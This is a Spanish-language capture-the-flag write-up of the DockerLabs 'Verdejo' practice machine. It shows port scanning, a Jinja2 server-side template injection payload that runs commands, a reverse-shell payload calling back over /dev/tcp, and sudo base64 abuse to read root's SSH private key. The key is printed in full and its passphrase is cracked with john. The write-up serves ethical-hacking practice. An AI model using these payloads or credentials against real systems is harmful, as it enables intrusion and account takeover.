---
title: Verdejo
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2025-01-24
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-verdejo/verdejo_logo.png
categories:
  - Docker_Labs
tags:
  - linux
  - dockerlabs
  - ssh
  - http
  - tcp
  - ssti
  - password_attacks
  - sudo_abuse
  - information_gathering
  - web_analysis
  - foothold
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/verdejo:-$ ping -c 1 127.17.0.2
PING 127.17.0.2 (127.17.0.2) 56(84) bytes of data.
64 bytes from 127.17.0.2: icmp_seq=1 ttl=64 time=0.062 ms

--- 127.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.062/0.062/0.062/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/verdejo:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG nmap1 127.17.0.2
Host: 127.17.0.2 ()     Status: Up
Host: 127.17.0.2 ()     Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 8089/open/tcp/////    Ignored State: closed (65532)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/verdejo:-$ sudo nmap -sCV -p22,80,8089 -vvv 127.17.0.2 -oN nmap2
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 dc:98:72:d5:05:7e:7a:c0:14:df:29:a1:0e:3d:05:ba (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKZZ30gHh3MJnOlBFsClzY4+XLHLM3yZHnYGk0bNxNPPQtaojCxlQAjpM4uWPkVKLWDJQ53wQ/HIeaaqsE7n8Fs=
|   256 39:42:28:c9:c8:fa:05:de:89:e6:37:62:4d:8b:f3:63 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHgwRMztrUMxAvJeiwbmls3FFWnEj11lPMbqFIDUorc2
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Apache2 Debian Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
8089/tcp open  http    syn-ack ttl 64 Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
|_http-title: Dale duro bro
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/dockerlabs/verdejo:-$ whatweb 127.17.0.2                                                                      
http://127.17.0.2 [200 OK] Apache[2.4.59], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.59 (Debian)], IP[127.17.0.2], Title[Apache2 Debian Default Page: It works]
/home/kali/Documents/dockerlabs/verdejo:-$ whatweb 127.17.0.2:8089
http://127.17.0.2:8089 [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.2.2 Python/3.11.2], IP[127.17.0.2], Python[3.11.2], Title[Dale duro bro], Werkzeug[2.2.2]
```

---
## Web Analysis

El puerto 80 muestra la plantilla predeterminada de Apache2 sin contenido relevante.

![](assets/img/dockerlabs-writeup-verdejo/verdejo1_1.png)

En el otro puerto HTTP, se encuentra un sitio sencillo con un único campo de entrada. A primera vista, no parece haber funcionalidad adicional ni características complejas.

![](assets/img/dockerlabs-writeup-verdejo/verdejo1_2.png)
![](assets/img/dockerlabs-writeup-verdejo/verdejo1_3.png)

Realizando pruebas para identificar qué tipo de vulnerabilidad podría estar presente en el campo de entrada, descubro que este es vulnerable a SSTI.

![](assets/img/dockerlabs-writeup-verdejo/verdejo2_1.png)
![](assets/img/dockerlabs-writeup-verdejo/verdejo2_2.png)
![](assets/img/dockerlabs-writeup-verdejo/verdejo2_3.png)
![](assets/img/dockerlabs-writeup-verdejo/verdejo2_4.png)

---
## Foothold

Específicamente, el campo es vulnerable a SSTI utilizando el motor de plantillas Jinja2.

Puedes revisar estas referencias para comprender mejor el ataque:

* [PortsWigger: Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)

* [OnSecurity: Server-Side Template Injection with Jinja2](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)

![](assets/img/dockerlabs-writeup-verdejo/verdejo2_5.png)

Para probar la vulnerabilidad, se utilizó la siguiente carga maliciosa que permite ejecutar comandos del sistema.

```
{\{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

> Nota: Se debe eliminar la barra invertida `\` dentro de las llaves `{\{`.
{: .prompt-warning }

![](assets/img/dockerlabs-writeup-verdejo/verdejo2_6.png)

```terminal
/home/kali/Documents/dockerlabs/verdejo:-$ nc -nvlp 4321           
	listening on [any] 4321 ...
```

Para obtener acceso a través de una reverse shell, se utilizó la siguiente carga.

```
{\{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \'bash -i >& /dev/tcp/192.168.0.171/4321 0>&1\'').read() }}
```

> Nota: Se debe eliminar la barra invertida `\` dentro de las llaves `{\{`.
{: .prompt-warning }

![](assets/img/dockerlabs-writeup-verdejo/verdejo2_7.png)

```terminal
	... connect to [192.168.0.171] from (UNKNOWN) [192.168.0.171] 45380

verde@kali:~$ id
uid=1000(verde) gid=1000(verde) groups=1000(verde)
```

---
## Privilege Escalation

```terminal
verde@kali:~$ cat /etc/passwd | grep /bash$
root:x:0:0:root:/root:/bin/bash
verde:x:1000:1000:verde,,,:/home/verde:/bin/bash
```

El usuario `verde` tiene acceso para ejecutar el comando `/usr/bin/base64` como `root` sin necesidad de contraseña.

```terminal
verde@kali:~$ sudo -l
Matching Defaults entries for verde on kali:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User verde may run the following commands on kali:
    (root) NOPASSWD: /usr/bin/base64
```

Según [GTFOBins](https://gtfobins.github.io/gtfobins/base64/#sudo), se puede usar base64 para decodificar el contenido de un archivo protegido.

```terminal
verde@kali:~$ sudo base64 /root/.ssh/id_rsa | base64 -d              

-----BEGIN OPENSSH PRIVATE KEY-----
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
vEACJSQrQKz9mWnewtRP5pzZk=
-----END OPENSSH PRIVATE KEY-----
```
```terminal
/home/kali/Documents/dockerlabs/verdejo:-$ chmod 600 id_rsa

/home/kali/Documents/dockerlabs/verdejo:-$ ssh root@127.17.0.2 -i id_rsa                                 
Enter passphrase for key 'id_rsa':
```

Intenté conectarme por SSH como `root` utilizando la clave privada obtenida, pero la clave estaba protegida con una contraseña.

Procedí a utilizar la herramienta ssh2john para extraer el hash de la clave privada y luego empleé john con el diccionario `rockyou.txt` para realizar un ataque de fuerza bruta.

```terminal
/home/kali/Documents/dockerlabs/verdejo:-$ ssh2john id_rsa > hash

/home/kali/Documents/dockerlabs/verdejo:-$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
honda1           (id_rsa)
```

Una vez obtenida la passphrase `honda1`, pude conectarme exitosamente como `root`.

```terminal
/home/kali/Documents/dockerlabs/verdejo:-$ ssh root@127.17.0.2 -i id_rsa
Enter passphrase for key 'id_rsa': honda1

root@kali:~# id
uid=0(root) gid=0(root) groups=0(root)
```
